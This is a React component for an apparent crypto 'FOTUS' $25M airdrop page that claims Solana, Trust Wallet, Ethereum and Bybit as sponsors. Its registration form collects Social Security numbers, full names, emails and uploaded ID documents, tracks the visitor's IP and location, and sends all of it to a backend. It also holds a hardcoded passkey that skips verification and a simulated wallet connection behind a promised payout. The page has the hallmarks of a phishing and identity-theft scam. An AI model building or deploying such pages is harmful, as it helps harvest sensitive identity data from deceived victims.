"use client";
import React from "react";

import { useUpload } from "../utilities/runtime-helpers";

function MainComponent() {
  const [currentView, setCurrentView] = React.useState("registration"); // 'registration' or 'dashboard'
  const [userEmail, setUserEmail] = React.useState("");
  const [isLoggedIn, setIsLoggedIn] = React.useState(false);
  const [walletConnected, setWalletConnected] = React.useState(false);
  const [walletAddress, setWalletAddress] = React.useState("");
  const [claimed, setClaimed] = React.useState(false);
  const [loading, setLoading] = React.useState(false);
  const [error, setError] = React.useState("");
  const [success, setSuccess] = React.useState("");

  // Registration form state
  const [formData, setFormData] = React.useState({
    email: "",
    fullName: "",
    ssn: "",
    passkey: "",
  });
  const [idDocument, setIdDocument] = React.useState(null);
  const [upload, { loading: uploadLoading }] = useUpload();

  // Get user's IP and location
  const [userLocation, setUserLocation] = React.useState(null);

  React.useEffect(() => {
    // Get user's IP and location data
    const getUserLocation = async () => {
      try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        setUserLocation(data);
      } catch (err) {
        console.error("Failed to get location:", err);
      }
    };
    getUserLocation();
  }, []);

  const handleInputChange = (field, value) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    setError("");
  };

  const handleFileUpload = async (event) => {
    const file = event.target.files[0];
    if (file) {
      setLoading(true);
      try {
        const { url, error } = await upload({ file });
        if (error) {
          setError("Failed to upload ID document");
        } else {
          setIdDocument(url);
        }
      } catch (err) {
        setError("Failed to upload ID document");
      }
      setLoading(false);
    }
  };

  const handleRegistration = async () => {
    if (!userLocation) {
      setError("Unable to verify location. Please try again.");
      return;
    }

    // Check for passkey first
    if (formData.passkey === "FAVOUR-FOTUS-ALPHA") {
      setUserEmail(formData.email || "passkey@fotus.com");
      setIsLoggedIn(true);
      setCurrentView("dashboard");
      setSuccess("Logged in successfully with passkey!");
      return;
    }

    // Validate required fields
    if (!formData.email || !formData.fullName || !formData.ssn || !idDocument) {
      setError("Please fill in all required fields and upload your ID");
      return;
    }

    setLoading(true);
    try {
      const response = await fetch("/api/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: formData.email,
          full_name: formData.fullName,
          ssn: formData.ssn,
          id_document_url: idDocument,
          ip_address: userLocation.ip,
          location_data: JSON.stringify({
            country: userLocation.country_code,
            proxy: userLocation.proxy || false,
            vpn: userLocation.vpn || false,
            city: userLocation.city,
            region: userLocation.region,
          }),
        }),
      });

      const result = await response.json();

      if (result.error) {
        setError(result.error);
      } else {
        setUserEmail(formData.email);
        setIsLoggedIn(true);
        setCurrentView("dashboard");
        setSuccess("Registration successful! Welcome to the Fotus Airdrop.");
      }
    } catch (err) {
      setError("Registration failed. Please try again.");
    }
    setLoading(false);
  };

  const connectWallet = () => {
    // Simulate wallet connection
    const mockAddress = "0x" + Math.random().toString(16).substr(2, 40);
    setWalletAddress(mockAddress);
    setWalletConnected(true);
    setSuccess("Wallet connected successfully!");
  };

  const claimAirdrop = async () => {
    if (!walletConnected) {
      setError("Please connect your wallet first");
      return;
    }

    setLoading(true);
    try {
      const response = await fetch("/api/claim", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: userEmail,
          wallet_address: walletAddress,
        }),
      });

      const result = await response.json();

      if (result.error) {
        setError(result.error);
      } else {
        setClaimed(true);
        setSuccess(
          "Successfully claimed! Airdrop will be delivered to your wallet in 72 hours."
        );
      }
    } catch (err) {
      setError("Claim failed. Please try again.");
    }
    setLoading(false);
  };

  if (currentView === "registration") {
    return (
      <div
        style={{
          minHeight: "100vh",
          background: "linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%)",
          fontFamily: "Arial, sans-serif",
        }}
      >
        {/* Header with logos */}
        <div
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            padding: "20px 40px",
            backgroundColor: "rgba(255, 255, 255, 0.1)",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            <div
              style={{
                width: "50px",
                height: "50px",
                backgroundColor: "#ff6b35",
                borderRadius: "50%",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "white",
                fontWeight: "bold",
              }}
            >
              F
            </div>
            <span
              style={{ color: "white", fontSize: "24px", fontWeight: "bold" }}
            >
              FOTUS
            </span>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            <span
              style={{ color: "white", fontSize: "24px", fontWeight: "bold" }}
            >
              SOLANA
            </span>
            <div
              style={{
                width: "50px",
                height: "50px",
                background: "linear-gradient(45deg, #9945ff, #14f195)",
                borderRadius: "50%",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "white",
                fontWeight: "bold",
              }}
            >
              S
            </div>
          </div>
        </div>

        {/* Main content */}
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            minHeight: "calc(100vh - 200px)",
            padding: "20px",
          }}
        >
          <div
            style={{
              backgroundColor: "white",
              padding: "40px",
              borderRadius: "15px",
              boxShadow: "0 20px 40px rgba(0,0,0,0.1)",
              width: "100%",
              maxWidth: "500px",
            }}
          >
            <h1
              style={{
                textAlign: "center",
                marginBottom: "30px",
                color: "#1e3a8a",
                fontSize: "28px",
              }}
            >
              Join the $25M FOTUS Airdrop
            </h1>

            {error && (
              <div
                style={{
                  backgroundColor: "#fee2e2",
                  color: "#dc2626",
                  padding: "10px",
                  borderRadius: "5px",
                  marginBottom: "20px",
                  textAlign: "center",
                }}
              >
                {error}
              </div>
            )}

            {success && (
              <div
                style={{
                  backgroundColor: "#d1fae5",
                  color: "#065f46",
                  padding: "10px",
                  borderRadius: "5px",
                  marginBottom: "20px",
                  textAlign: "center",
                }}
              >
                {success}
              </div>
            )}

            <div style={{ marginBottom: "20px" }}>
              <label
                style={{
                  display: "block",
                  marginBottom: "5px",
                  fontWeight: "bold",
                }}
              >
                Email Address *
              </label>
              <input
                type="email"
                value={formData.email}
                onChange={(e) => handleInputChange("email", e.target.value)}
                style={{
                  width: "100%",
                  padding: "12px",
                  border: "2px solid #e5e7eb",
                  borderRadius: "8px",
                  fontSize: "16px",
                }}
                placeholder="Enter your email"
              />
            </div>

            <div style={{ marginBottom: "20px" }}>
              <label
                style={{
                  display: "block",
                  marginBottom: "5px",
                  fontWeight: "bold",
                }}
              >
                Full Name *
              </label>
              <input
                type="text"
                value={formData.fullName}
                onChange={(e) => handleInputChange("fullName", e.target.value)}
                style={{
                  width: "100%",
                  padding: "12px",
                  border: "2px solid #e5e7eb",
                  borderRadius: "8px",
                  fontSize: "16px",
                }}
                placeholder="Enter your full name"
              />
            </div>

            <div style={{ marginBottom: "20px" }}>
              <label
                style={{
                  display: "block",
                  marginBottom: "5px",
                  fontWeight: "bold",
                }}
              >
                SSN (US Citizens Only) *
              </label>
              <input
                type="text"
                value={formData.ssn}
                onChange={(e) => handleInputChange("ssn", e.target.value)}
                style={{
                  width: "100%",
                  padding: "12px",
                  border: "2px solid #e5e7eb",
                  borderRadius: "8px",
                  fontSize: "16px",
                }}
                placeholder="XXX-XX-XXXX"
                maxLength="11"
              />
            </div>

            <div style={{ marginBottom: "20px" }}>
              <label
                style={{
                  display: "block",
                  marginBottom: "5px",
                  fontWeight: "bold",
                }}
              >
                Upload ID Document *
              </label>
              <input
                type="file"
                onChange={handleFileUpload}
                accept="image/*,.pdf"
                style={{
                  width: "100%",
                  padding: "12px",
                  border: "2px solid #e5e7eb",
                  borderRadius: "8px",
                  fontSize: "16px",
                }}
              />
              {idDocument && (
                <div
                  style={{
                    marginTop: "5px",
                    color: "#059669",
                    fontSize: "14px",
                  }}
                >
                  ✓ ID document uploaded successfully
                </div>
              )}
            </div>

            <button
              onClick={handleRegistration}
              disabled={loading || uploadLoading}
              style={{
                width: "100%",
                padding: "15px",
                backgroundColor: loading ? "#9ca3af" : "#1e3a8a",
                color: "white",
                border: "none",
                borderRadius: "8px",
                fontSize: "18px",
                fontWeight: "bold",
                cursor: loading ? "not-allowed" : "pointer",
                marginBottom: "20px",
              }}
            >
              {loading ? "Processing..." : "Register"}
            </button>

            <div
              style={{
                borderTop: "1px solid #e5e7eb",
                paddingTop: "20px",
                marginTop: "20px",
              }}
            >
              <label
                style={{
                  display: "block",
                  marginBottom: "5px",
                  fontWeight: "bold",
                }}
              >
                Have a Passkey? Skip Verification
              </label>
              <input
                type="text"
                value={formData.passkey}
                onChange={(e) => handleInputChange("passkey", e.target.value)}
                style={{
                  width: "100%",
                  padding: "12px",
                  border: "2px solid #e5e7eb",
                  borderRadius: "8px",
                  fontSize: "16px",
                  marginBottom: "10px",
                }}
                placeholder="Enter passkey"
              />
              <button
                onClick={handleRegistration}
                disabled={!formData.passkey}
                style={{
                  width: "100%",
                  padding: "12px",
                  backgroundColor: formData.passkey ? "#059669" : "#9ca3af",
                  color: "white",
                  border: "none",
                  borderRadius: "8px",
                  fontSize: "16px",
                  fontWeight: "bold",
                  cursor: formData.passkey ? "pointer" : "not-allowed",
                }}
              >
                Login with Passkey
              </button>
            </div>
          </div>
        </div>

        {/* Footer warning */}
        <div
          style={{
            textAlign: "center",
            padding: "20px",
            color: "white",
            backgroundColor: "rgba(0,0,0,0.2)",
          }}
        >
          <p style={{ margin: 0, fontSize: "14px" }}>
            ⚠️ <strong>IMPORTANT:</strong> VPN and proxy usage is strictly
            prohibited. Violators will be denied access to the airdrop.
          </p>
        </div>
      </div>
    );
  }

  // Dashboard view
  return (
    <div
      style={{
        minHeight: "100vh",
        background: "linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%)",
        fontFamily: "Arial, sans-serif",
      }}
    >
      {/* Header */}
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          padding: "20px 40px",
          backgroundColor: "rgba(255, 255, 255, 0.1)",
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: "20px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            <div
              style={{
                width: "40px",
                height: "40px",
                backgroundColor: "#ff6b35",
                borderRadius: "50%",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "white",
                fontWeight: "bold",
              }}
            >
              F
            </div>
            <span
              style={{ color: "white", fontSize: "20px", fontWeight: "bold" }}
            >
              FOTUS
            </span>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            <span
              style={{ color: "white", fontSize: "20px", fontWeight: "bold" }}
            >
              SOLANA
            </span>
            <div
              style={{
                width: "40px",
                height: "40px",
                background: "linear-gradient(45deg, #9945ff, #14f195)",
                borderRadius: "50%",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                color: "white",
                fontWeight: "bold",
              }}
            >
              S
            </div>
          </div>
        </div>

        <button
          onClick={connectWallet}
          style={{
            padding: "10px 20px",
            backgroundColor: walletConnected ? "#059669" : "#ff6b35",
            color: "white",
            border: "none",
            borderRadius: "25px",
            fontSize: "16px",
            fontWeight: "bold",
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            gap: "8px",
          }}
        >
          <i className="fas fa-wallet"></i>
          {walletConnected ? "Wallet Connected" : "Connect Wallet"}
        </button>
      </div>

      <div style={{ display: "flex", minHeight: "calc(100vh - 80px)" }}>
        {/* Sponsors sidebar */}
        <div
          style={{
            width: "250px",
            backgroundColor: "rgba(255, 255, 255, 0.1)",
            padding: "30px 20px",
          }}
        >
          <h3
            style={{
              color: "white",
              marginBottom: "20px",
              textAlign: "center",
            }}
          >
            Our Sponsors
          </h3>

          <div
            style={{ display: "flex", flexDirection: "column", gap: "20px" }}
          >
            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "10px",
                padding: "10px",
                backgroundColor: "rgba(255, 255, 255, 0.1)",
                borderRadius: "8px",
              }}
            >
              <div
                style={{
                  width: "30px",
                  height: "30px",
                  background: "linear-gradient(45deg, #9945ff, #14f195)",
                  borderRadius: "50%",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "white",
                  fontSize: "12px",
                  fontWeight: "bold",
                }}
              >
                S
              </div>
              <span style={{ color: "white", fontSize: "14px" }}>Solana</span>
            </div>

            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "10px",
                padding: "10px",
                backgroundColor: "rgba(255, 255, 255, 0.1)",
                borderRadius: "8px",
              }}
            >
              <div
                style={{
                  width: "30px",
                  height: "30px",
                  backgroundColor: "#3375bb",
                  borderRadius: "8px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "white",
                  fontSize: "12px",
                  fontWeight: "bold",
                }}
              >
                🛡️
              </div>
              <span style={{ color: "white", fontSize: "14px" }}>
                Trust Wallet
              </span>
            </div>

            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "10px",
                padding: "10px",
                backgroundColor: "rgba(255, 255, 255, 0.1)",
                borderRadius: "8px",
              }}
            >
              <div
                style={{
                  width: "30px",
                  height: "30px",
                  backgroundColor: "#627eea",
                  borderRadius: "50%",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "white",
                  fontSize: "12px",
                  fontWeight: "bold",
                }}
              >
                ♦
              </div>
              <span style={{ color: "white", fontSize: "14px" }}>Ethereum</span>
            </div>

            <div
              style={{
                display: "flex",
                alignItems: "center",
                gap: "10px",
                padding: "10px",
                backgroundColor: "rgba(255, 255, 255, 0.1)",
                borderRadius: "8px",
              }}
            >
              <div
                style={{
                  width: "30px",
                  height: "30px",
                  backgroundColor: "#f7931a",
                  borderRadius: "50%",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "white",
                  fontSize: "12px",
                  fontWeight: "bold",
                }}
              >
                B
              </div>
              <span style={{ color: "white", fontSize: "14px" }}>Bybit</span>
            </div>
          </div>
        </div>

        {/* Main content */}
        <div
          style={{
            flex: 1,
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            alignItems: "center",
            padding: "40px",
          }}
        >
          {error && (
            <div
              style={{
                backgroundColor: "#fee2e2",
                color: "#dc2626",
                padding: "15px",
                borderRadius: "8px",
                marginBottom: "20px",
                textAlign: "center",
                maxWidth: "500px",
                width: "100%",
              }}
            >
              {error}
            </div>
          )}

          {success && (
            <div
              style={{
                backgroundColor: "#d1fae5",
                color: "#065f46",
                padding: "15px",
                borderRadius: "8px",
                marginBottom: "20px",
                textAlign: "center",
                maxWidth: "500px",
                width: "100%",
              }}
            >
              {success}
            </div>
          )}

          <div
            style={{
              textAlign: "center",
              backgroundColor: "rgba(255, 255, 255, 0.1)",
              padding: "60px 40px",
              borderRadius: "20px",
              maxWidth: "600px",
              width: "100%",
            }}
          >
            <h1
              style={{
                color: "white",
                fontSize: "48px",
                marginBottom: "20px",
                fontWeight: "bold",
              }}
            >
              Claim Your Share
            </h1>
            <h2
              style={{
                color: "#fbbf24",
                fontSize: "36px",
                marginBottom: "30px",
                fontWeight: "bold",
              }}
            >
              $25 Million FOTUS Airdrop
            </h2>

            {claimed ? (
              <div
                style={{
                  backgroundColor: "#d1fae5",
                  color: "#065f46",
                  padding: "30px",
                  borderRadius: "15px",
                  marginBottom: "20px",
                }}
              >
                <i
                  className="fas fa-check-circle"
                  style={{ fontSize: "48px", marginBottom: "15px" }}
                ></i>
                <h3 style={{ margin: "0 0 10px 0" }}>Successfully Claimed!</h3>
                <p style={{ margin: 0 }}>
                  Your airdrop will be delivered to your wallet in 72 hours.
                </p>
              </div>
            ) : (
              <button
                onClick={claimAirdrop}
                disabled={!walletConnected || loading}
                style={{
                  padding: "20px 60px",
                  backgroundColor:
                    !walletConnected || loading ? "#9ca3af" : "#fbbf24",
                  color: !walletConnected || loading ? "#6b7280" : "#1f2937",
                  border: "none",
                  borderRadius: "50px",
                  fontSize: "24px",
                  fontWeight: "bold",
                  cursor:
                    !walletConnected || loading ? "not-allowed" : "pointer",
                  boxShadow: "0 10px 20px rgba(0,0,0,0.2)",
                  transition: "all 0.3s ease",
                }}
              >
                {loading ? "Processing..." : "CLAIM AIRDROP"}
              </button>
            )}

            {!walletConnected && (
              <p
                style={{
                  color: "#fbbf24",
                  marginTop: "20px",
                  fontSize: "16px",
                }}
              >
                Please connect your wallet to claim your airdrop
              </p>
            )}

            {walletConnected && (
              <div
                style={{
                  marginTop: "20px",
                  color: "white",
                  fontSize: "14px",
                  backgroundColor: "rgba(0,0,0,0.2)",
                  padding: "10px",
                  borderRadius: "8px",
                }}
              >
                Connected: {walletAddress.slice(0, 6)}...
                {walletAddress.slice(-4)}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

export default MainComponent;